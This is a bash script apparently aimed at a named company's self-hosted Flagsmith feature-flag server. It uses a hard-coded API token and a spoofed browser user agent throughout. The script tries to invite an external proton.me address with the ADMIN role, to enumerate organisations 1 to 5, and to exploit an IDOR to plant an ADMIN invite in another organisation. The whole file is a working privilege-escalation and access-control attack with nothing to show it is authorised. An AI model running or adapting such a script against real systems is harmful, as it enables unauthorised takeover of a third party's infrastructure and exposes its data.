#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="5da1b5ae6b74de3bbaee92e1e979e1ffd39c0d67"

# FIRST: Try creating invite with ADMIN role (our own org 50)
echo "=== SELF-INVITE ADMIN ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/50/invites/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-escalate@proton.me","role":"ADMIN","frontend_base_url":"https://flagsmith.koinworks.com"}' --max-time 15
echo ""

# SECOND: Try accessing KoinWorks org (ID 1-5, might be accessible)
echo "=== KOINWORKS ORG ==="
for oid in 1 2 3 4 5; do
  echo -n "Org $oid: "
  curl -s "https://flagsmith.koinworks.com/api/v1/organisations/${oid}/" \
    -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 5
  echo ""
done

# THIRD: Try to create invite in OTHER org (IDOR)
echo "=== IDOR INVITE ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/1/invites/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-idor-invite@proton.me","role":"ADMIN"}' --max-time 15
echo ""
